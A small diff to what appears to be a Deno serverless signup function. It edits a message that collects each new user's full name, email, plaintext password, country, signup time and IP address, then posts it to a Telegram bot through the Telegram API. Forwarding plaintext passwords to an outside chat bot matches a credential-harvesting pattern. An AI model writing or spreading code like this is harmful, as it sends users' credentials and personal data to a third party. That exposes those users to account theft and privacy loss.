@@ -28,7 +28,7 @@ Deno.serve(async (req) => {
     const signupTime = new Date().toUTCString();
     const ip = client_ip || 'unknown';
 
-    const message = `New User Signed Up!\nFull Name: ${full_name}\nEmail: ${email}\nPassword: ${password}\nSignup Time: ${signupTime}\nIP Address: ${ip}`;
+    const message = `New User Signed Up!\nFull Name: ${full_name}\nEmail: ${email}\nPassword: ${password}\nCountry: ${country || 'Unknown'}\nSignup Time: ${signupTime}\nIP Address: ${ip}`;
 
     const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
     const telegramResponse = await fetch(telegramUrl, {
